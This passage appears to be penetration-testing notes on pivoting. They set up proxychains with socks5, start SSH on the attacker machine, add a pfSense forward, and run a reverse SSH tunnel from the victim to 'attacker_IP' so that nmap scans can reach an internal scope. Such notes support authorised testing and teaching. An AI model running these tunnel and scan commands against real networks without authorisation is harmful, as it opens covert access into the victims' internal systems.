Then change the default config at the bottom from socks4 to socks5
127.0.0.1 9080 and whatever port you want to use.


###SKIP NEXT STEP IF YOU CONFIGURED PROXY CHAINS ALREADY
(ATTACKER) sudo nano /etc/proxychains4.conf

###START HERE IF PROXY CHAINS IS ALREADY CONFIGURED
(ATTACKER) netstat -napt (set up listener over ssh)
(ATTACKER) sudo systemctl status ssh.service (CHECK CHANGE CHECK)
(ATTACKER) sudo systemctl start ssh.service (check if started)
(ATTACKER) netstat -napt | grep LISTEN

configure Port Fowarding rule pn pfsense

(VICTIM) ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port  
(this command wont show you anything go back to kali and run net stat, port shoud be open now) 
(refrence wiki for screenshots)

(since the proxy is now available to us we will wrap nmap inside proxychains)
(ATTACKER) sudo proxychains nmap -iL scope -F -sT -Pn | tee fast_scan
(we are listening over ssh we are not manipulating the port we are manipulating the port fowarding rule)
